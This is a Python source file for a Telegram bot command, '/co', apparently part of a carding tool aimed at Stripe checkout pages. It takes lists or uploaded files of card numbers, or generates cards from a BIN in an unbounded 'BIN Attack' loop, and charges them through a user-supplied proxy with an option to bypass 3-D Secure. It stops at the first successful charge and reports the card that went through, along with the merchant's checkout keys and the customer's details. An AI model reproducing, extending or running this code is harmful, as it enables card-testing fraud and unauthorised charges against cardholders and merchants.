import time

from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

from functions.access import check_access
from functions.card_utils import parse_cards
from functions.bin_generator import detect_bin, generate_card_from_bin
from functions.co_functions import (
    extract_checkout_url,
    get_checkout_info,
    get_currency_symbol,
    check_checkout_active,
)
from functions.charge_functions import charge_card
from functions.proxy_utils import get_user_proxy, get_proxy_info

router = Router()

ACCESS_DENIED = (
    "<blockquote><code>Access Denied</code></blockquote>\n\n"
    "<blockquote>「❃」 You are not authorized to use this bot</blockquote>"
)


@router.message(Command("co"))
async def co_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(ACCESS_DENIED, parse_mode=ParseMode.HTML)
        return

    start_time = time.perf_counter()
    user_id = msg.from_user.id
    text = msg.text or ""
    lines = text.strip().split('\n')
    first_line_args = lines[0].split(maxsplit=3)

    if len(first_line_args) < 2:
        await msg.answer(
            "<blockquote><code>Stripe Checkout</code></blockquote>\n\n"
            "<blockquote>「❃」 Parse : <code>/co url</code>\n"
            "「❃」 Charge : <code>/co url cc|mm|yy|cvv</code>\n"
            "「❃」 Bypass : <code>/co url yes/no cc|mm|yy|cvv</code>\n"
            "「❃」 BIN : <code>/co url 424242</code>\n"
            "「❃」 BIN+Bypass : <code>/co url yes 424242</code>\n"
            "「❃」 File : <code>Reply to .txt with /co url</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    url = extract_checkout_url(first_line_args[1])
    if not url:
        url = first_line_args[1].strip()

    cards = []
    bypass_3ds = False
    bin_str = None

    if len(first_line_args) > 2:
        if first_line_args[2].lower() in ('yes', 'no'):
            bypass_3ds = first_line_args[2].lower() == 'yes'
            if len(first_line_args) > 3:
                bin_str = detect_bin(first_line_args[3])
                if not bin_str:
                    cards = parse_cards(first_line_args[3])
        else:
            bin_str = detect_bin(first_line_args[2])
            if not bin_str:
                cards = parse_cards(first_line_args[2])

    if len(lines) > 1 and not bin_str:
        remaining_text = '\n'.join(lines[1:])
        cards.extend(parse_cards(remaining_text))

    if msg.reply_to_message and msg.reply_to_message.document and not bin_str:
        doc = msg.reply_to_message.document
        if doc.file_name and doc.file_name.endswith('.txt'):
            try:
                file = await msg.bot.get_file(doc.file_id)
                file_content = await msg.bot.download_file(file.file_path)
                text_content = file_content.read().decode('utf-8')
                cards = parse_cards(text_content)
            except Exception as e:
                await msg.answer(
                    "<blockquote><code>Error</code></blockquote>\n\n"
                    f"<blockquote>「❃」 Detail : <code>Failed to read file: {str(e)}</code></blockquote>",
                    parse_mode=ParseMode.HTML,
                )
                return

    user_proxy = get_user_proxy(user_id)

    if not user_proxy:
        await msg.answer(
            "<blockquote><code>No Proxy</code></blockquote>\n\n"
            "<blockquote>「❃」 Status : <code>You must set a proxy first</code>\n"
            "「❃」 Action : <code>/addproxy host:port:user:pass</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    proxy_info = await get_proxy_info(user_proxy)

    if proxy_info["status"] == "dead":
        await msg.answer(
            "<blockquote><code>Proxy Dead</code></blockquote>\n\n"
            "<blockquote>「❃」 Status : <code>Your proxy is not responding</code>\n"
            "「❃」 Action : <code>Check /proxy or /removeproxy</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    proxy_display = f"LIVE | {proxy_info['ip_obfuscated']}"

    processing_msg = await msg.answer(
        "<blockquote><code>Processing ...</code></blockquote>\n\n"
        f"<blockquote>「❃」 Proxy : <code>{proxy_display}</code>\n"
        "「❃」 Status : <code>Parsing checkout...</code></blockquote>",
        parse_mode=ParseMode.HTML,
    )

    checkout_data = await get_checkout_info(url)

    if checkout_data.get("error"):
        await processing_msg.edit_text(
            "<blockquote><code>Error</code></blockquote>\n\n"
            f"<blockquote>「❃」 Detail : <code>{checkout_data['error']}</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    if bin_str:
        await _charge_bin(
            processing_msg, bin_str, checkout_data, url,
            user_proxy, proxy_display, bypass_3ds, start_time,
        )
        return

    if not cards:
        await _show_checkout_info(processing_msg, checkout_data, proxy_display, start_time)
        return

    await _charge_cards(
        processing_msg, cards, checkout_data, url,
        user_proxy, proxy_display, bypass_3ds, start_time,
    )


async def _charge_bin(
    processing_msg: Message,
    bin_str: str,
    checkout_data: dict,
    url: str,
    user_proxy: str,
    proxy_display: str,
    bypass_3ds: bool,
    start_time: float,
):
    bypass_str = "YES" if bypass_3ds else "NO"
    currency = checkout_data.get('currency', '')
    sym = get_currency_symbol(currency)
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"

    await processing_msg.edit_text(
        f"<blockquote><code>BIN Attack {price_str}</code></blockquote>\n\n"
        f"<blockquote>「❃」 BIN : <code>{bin_str}</code>\n"
        f"「❃」 Proxy : <code>{proxy_display}</code>\n"
        f"「❃」 Bypass : <code>{bypass_str}</code>\n"
        f"「❃」 Merchant : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        f"「❃」 Status : <code>Generating cards...</code></blockquote>",
        parse_mode=ParseMode.HTML,
    )

    results = []
    charged_card = None
    link_dead = False
    total_tried = 0
    check_interval = 5
    last_update = time.perf_counter()
    seen_cards = set()

    while not charged_card and not link_dead:
        card = generate_card_from_bin(bin_str)

        if card["cc"] in seen_cards:
            continue
        seen_cards.add(card["cc"])
        total_tried += 1

        result = await charge_card(card, checkout_data, user_proxy, bypass_3ds)
        results.append(result)

        if result['status'] == 'CHARGED':
            charged_card = result
            break

        if total_tried % check_interval == 0:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                link_dead = True
                break

        if (time.perf_counter() - last_update) > 2.0:
            last_update = time.perf_counter()
            charged = sum(1 for r in results if r['status'] == 'CHARGED')
            declined = sum(1 for r in results if r['status'] == 'DECLINED')
            three_ds = sum(1 for r in results if r['status'] in ('3DS', '3DS SKIP'))
            errors = sum(1 for r in results if r['status'] in ('ERROR', 'FAILED'))
            elapsed = round(time.perf_counter() - start_time, 1)

            last_card = f"{card['cc'][:6]}...{card['cc'][-4:]}"

            try:
                await processing_msg.edit_text(
                    f"<blockquote><code>BIN Attack {price_str}</code></blockquote>\n\n"
                    f"<blockquote>「❃」 BIN : <code>{bin_str}</code>\n"
                    f"「❃」 Proxy : <code>{proxy_display}</code>\n"
                    f"「❃」 Bypass : <code>{bypass_str}</code>\n"
                    f"「❃」 Tried : <code>{total_tried}</code>\n"
                    f"「❃」 Last : <code>{last_card}</code></blockquote>\n\n"
                    f"<blockquote>「❃」 Charged : <code>{charged}</code>\n"
                    f"「❃」 Declined : <code>{declined}</code>\n"
                    f"「❃」 3DS : <code>{three_ds}</code>\n"
                    f"「❃」 Errors : <code>{errors}</code>\n"
                    f"「❃」 Time : <code>{elapsed}s</code></blockquote>",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass

    total_time = round(time.perf_counter() - start_time, 2)
    charged_count = sum(1 for r in results if r['status'] == 'CHARGED')
    declined_count = sum(1 for r in results if r['status'] == 'DECLINED')
    three_ds_count = sum(1 for r in results if r['status'] in ('3DS', '3DS SKIP'))
    error_count = sum(1 for r in results if r['status'] in ('ERROR', 'FAILED', 'UNKNOWN'))

    if charged_card:
        response = f"<blockquote><code>BIN Hit {price_str}</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 BIN : <code>{bin_str}</code>\n"
        response += f"「❃」 Proxy : <code>{proxy_display}</code>\n"
        response += f"「❃」 Bypass : <code>{bypass_str}</code>\n"
        response += f"「❃」 Merchant : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 Product : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 Card : <code>{charged_card['card']}</code>\n"
        response += f"「❃」 Status : <code>CHARGED</code>\n"
        response += f"「❃」 Response : <code>{charged_card['response']}</code></blockquote>\n\n"
        if checkout_data.get('success_url'):
            response += f"<blockquote>「❃」 Success : <a href=\"{checkout_data['success_url']}\">Open</a></blockquote>\n\n"
        response += f"<blockquote>「❃」 Tried : <code>{total_tried} cards</code>\n"
        response += f"「❃」 Declined : <code>{declined_count}</code>\n"
        response += f"「❃」 3DS : <code>{three_ds_count}</code>\n"
        response += f"「❃」 Total Time : <code>{total_time}s</code></blockquote>"
    elif link_dead:
        response = f"<blockquote><code>Link Dead</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 BIN : <code>{bin_str}</code>\n"
        response += f"「❃」 Proxy : <code>{proxy_display}</code>\n"
        response += f"「❃」 Merchant : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 Reason : <code>Checkout no longer active</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 Tried : <code>{total_tried} cards</code>\n"
        response += f"「❃」 Charged : <code>{charged_count}</code>\n"
        response += f"「❃」 Declined : <code>{declined_count}</code>\n"
        response += f"「❃」 3DS : <code>{three_ds_count}</code>\n"
        if error_count > 0:
            response += f"「❃」 Errors : <code>{error_count}</code>\n"
        response += f"「❃」 Total Time : <code>{total_time}s</code></blockquote>"
    else:
        response = f"<blockquote><code>BIN Complete</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 BIN : <code>{bin_str}</code>\n"
        response += f"「❃」 Tried : <code>{total_tried} cards</code>\n"
        response += f"「❃」 No successful charge\n"
        response += f"「❃」 Total Time : <code>{total_time}s</code></blockquote>"

    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


async def _show_checkout_info(
    processing_msg: Message,
    checkout_data: dict,
    proxy_display: str,
    start_time: float,
):
    currency = checkout_data.get('currency', '')
    sym = get_currency_symbol(currency)
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
    total_time = round(time.perf_counter() - start_time, 2)

    response = f"<blockquote><code>Stripe Checkout {price_str}</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 Proxy : <code>{proxy_display}</code>\n"
    response += f"「❃」 CS : <code>{checkout_data['cs'] or 'N/A'}</code>\n"
    response += f"「❃」 PK : <code>{checkout_data['pk'] or 'N/A'}</code>\n"
    response += f"「❃」 Status : <code>SUCCESS</code></blockquote>\n\n"

    response += f"<blockquote>「❃」 Merchant : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 Product : <code>{checkout_data['product'] or 'N/A'}</code>\n"
    response += f"「❃」 Country : <code>{checkout_data['country'] or 'N/A'}</code>\n"
    response += f"「❃」 Mode : <code>{checkout_data['mode'] or 'N/A'}</code></blockquote>\n\n"

    if checkout_data['customer_name'] or checkout_data['customer_email']:
        response += f"<blockquote>「❃」 Customer : <code>{checkout_data['customer_name'] or 'N/A'}</code>\n"
        response += f"「❃」 Email : <code>{checkout_data['customer_email'] or 'N/A'}</code></blockquote>\n\n"

    if checkout_data['support_email'] or checkout_data['support_phone']:
        response += f"<blockquote>「❃」 Support : <code>{checkout_data['support_email'] or 'N/A'}</code>\n"
        response += f"「❃」 Phone : <code>{checkout_data['support_phone'] or 'N/A'}</code></blockquote>\n\n"

    if checkout_data['cards_accepted']:
        response += f"<blockquote>「❃」 Cards : <code>{checkout_data['cards_accepted']}</code></blockquote>\n\n"

    if checkout_data['success_url'] or checkout_data['cancel_url']:
        response += f"<blockquote>「❃」 Success : <code>{checkout_data['success_url'] or 'N/A'}</code>\n"
        response += f"「❃」 Cancel : <code>{checkout_data['cancel_url'] or 'N/A'}</code></blockquote>\n\n"

    response += f"<blockquote>「❃」 Command : <code>/co</code>\n"
    response += f"「❃」 Time : <code>{total_time}s</code></blockquote>"

    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)


async def _charge_cards(
    processing_msg: Message,
    cards: list,
    checkout_data: dict,
    url: str,
    user_proxy: str,
    proxy_display: str,
    bypass_3ds: bool,
    start_time: float,
):
    bypass_str = "YES" if bypass_3ds else "NO"
    currency = checkout_data.get('currency', '')
    sym = get_currency_symbol(currency)
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"

    await processing_msg.edit_text(
        f"<blockquote><code>Charging {price_str}</code></blockquote>\n\n"
        f"<blockquote>「❃」 Proxy : <code>{proxy_display}</code>\n"
        f"「❃」 Bypass : <code>{bypass_str}</code>\n"
        f"「❃」 Cards : <code>{len(cards)}</code>\n"
        f"「❃」 Status : <code>Starting...</code></blockquote>",
        parse_mode=ParseMode.HTML,
    )

    results = []
    charged_card = None
    cancelled = False
    check_interval = 5
    last_update = time.perf_counter()

    for i, card in enumerate(cards):
        if len(cards) > 1 and i > 0 and i % check_interval == 0:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                cancelled = True
                break

        result = await charge_card(card, checkout_data, user_proxy, bypass_3ds)
        results.append(result)

        if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
            last_update = time.perf_counter()
            charged = sum(1 for r in results if r['status'] == 'CHARGED')
            declined = sum(1 for r in results if r['status'] == 'DECLINED')
            three_ds = sum(1 for r in results if r['status'] in ('3DS', '3DS SKIP'))
            errors = sum(1 for r in results if r['status'] in ('ERROR', 'FAILED'))

            try:
                await processing_msg.edit_text(
                    f"<blockquote><code>Charging {price_str}</code></blockquote>\n\n"
                    f"<blockquote>「❃」 Proxy : <code>{proxy_display}</code>\n"
                    f"「❃」 Bypass : <code>{bypass_str}</code>\n"
                    f"「❃」 Progress : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
                    f"<blockquote>「❃」 Charged : <code>{charged}</code>\n"
                    f"「❃」 Declined : <code>{declined}</code>\n"
                    f"「❃」 3DS : <code>{three_ds}</code>\n"
                    f"「❃」 Errors : <code>{errors}</code></blockquote>",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass

        if result['status'] == 'CHARGED':
            charged_card = result
            break

    total_time = round(time.perf_counter() - start_time, 2)

    if cancelled:
        response = _build_cancelled_response(
            results, cards, checkout_data, proxy_display, total_time,
        )
    elif charged_card:
        response = _build_charged_response(
            results, cards, charged_card, checkout_data, url,
            proxy_display, bypass_str, price_str, total_time,
        )
    elif len(results) == 1:
        response = _build_single_result_response(
            results[0], checkout_data, proxy_display, bypass_str, price_str, total_time,
        )
    else:
        response = _build_batch_result_response(
            results, checkout_data, proxy_display, bypass_str, price_str, total_time,
        )

    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


def _build_cancelled_response(results, cards, checkout_data, proxy_display, total_time):
    charged = sum(1 for r in results if r['status'] == 'CHARGED')
    declined = sum(1 for r in results if r['status'] == 'DECLINED')
    three_ds = sum(1 for r in results if r['status'] in ('3DS', '3DS SKIP'))

    response = f"<blockquote><code>Checkout Cancelled</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 Proxy : <code>{proxy_display}</code>\n"
    response += f"「❃」 Merchant : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 Reason : <code>Checkout no longer active</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 Tried : <code>{len(results)}/{len(cards)} cards</code>\n"
    response += f"「❃」 Charged : <code>{charged}</code>\n"
    response += f"「❃」 Declined : <code>{declined}</code>\n"
    response += f"「❃」 3DS : <code>{three_ds}</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 Command : <code>/co</code>\n"
    response += f"「❃」 Total Time : <code>{total_time}s</code></blockquote>"
    return response


def _build_charged_response(
    results, cards, charged_card, checkout_data, url,
    proxy_display, bypass_str, price_str, total_time,
):
    response = f"<blockquote><code>Stripe Charge {price_str}</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 Proxy : <code>{proxy_display}</code>\n"
    response += f"「❃」 Bypass : <code>{bypass_str}</code>\n"
    response += f"「❃」 Merchant : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 Product : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"

    response += f"<blockquote>「❃」 Card : <code>{charged_card['card']}</code>\n"
    response += f"「❃」 Status : <code>CHARGED</code>\n"
    response += f"「❃」 Response : <code>{charged_card['response']}</code>\n"
    response += f"「❃」 Time : <code>{charged_card['time']}s</code></blockquote>\n\n"

    if checkout_data.get('success_url'):
        response += f"<blockquote>「❃」 Success URL : <a href=\"{checkout_data['success_url']}\">Open</a></blockquote>\n\n"

    response += f"<blockquote>「❃」 Checkout : <a href=\"{url}\">Open Checkout</a></blockquote>\n\n"

    if len(results) > 1:
        response += f"<blockquote>「❃」 Tried : <code>{len(results)}/{len(cards)} cards</code></blockquote>\n\n"

    response += f"<blockquote>「❃」 Command : <code>/co</code>\n"
    response += f"「❃」 Total Time : <code>{total_time}s</code></blockquote>"
    return response


def _build_single_result_response(result, checkout_data, proxy_display, bypass_str, price_str, total_time):
    response = f"<blockquote><code>Stripe Charge {price_str}</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 Proxy : <code>{proxy_display}</code>\n"
    response += f"「❃」 Bypass : <code>{bypass_str}</code>\n"
    response += f"「❃」 Merchant : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 Product : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"

    response += f"<blockquote>「❃」 Card : <code>{result['card']}</code>\n"
    response += f"「❃」 Status : <code>{result['status']}</code>\n"
    response += f"「❃」 Response : <code>{result['response']}</code>\n"
    response += f"「❃」 Time : <code>{result['time']}s</code></blockquote>\n\n"

    response += f"<blockquote>「❃」 Command : <code>/co</code>\n"
    response += f"「❃」 Total Time : <code>{total_time}s</code></blockquote>"
    return response


def _build_batch_result_response(results, checkout_data, proxy_display, bypass_str, price_str, total_time):
    charged = sum(1 for r in results if r['status'] == 'CHARGED')
    declined = sum(1 for r in results if r['status'] == 'DECLINED')
    three_ds = sum(1 for r in results if r['status'] in ('3DS', '3DS SKIP'))
    errors = sum(1 for r in results if r['status'] in ('ERROR', 'FAILED', 'UNKNOWN'))
    total = len(results)

    response = f"<blockquote><code>Stripe Charge {price_str}</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 Proxy : <code>{proxy_display}</code>\n"
    response += f"「❃」 Bypass : <code>{bypass_str}</code>\n"
    response += f"「❃」 Merchant : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 Product : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"

    response += f"<blockquote>「❃」 Charged : <code>{charged}/{total}</code>\n"
    response += f"「❃」 Declined : <code>{declined}/{total}</code>\n"
    response += f"「❃」 3DS : <code>{three_ds}/{total}</code>\n"
    if errors > 0:
        response += f"「❃」 Errors : <code>{errors}/{total}</code>\n"
    response += f"</blockquote>\n\n"

    response += f"<blockquote>「❃」 Command : <code>/co</code>\n"
    response += f"「❃」 Total Time : <code>{total_time}s</code></blockquote>"
    return response
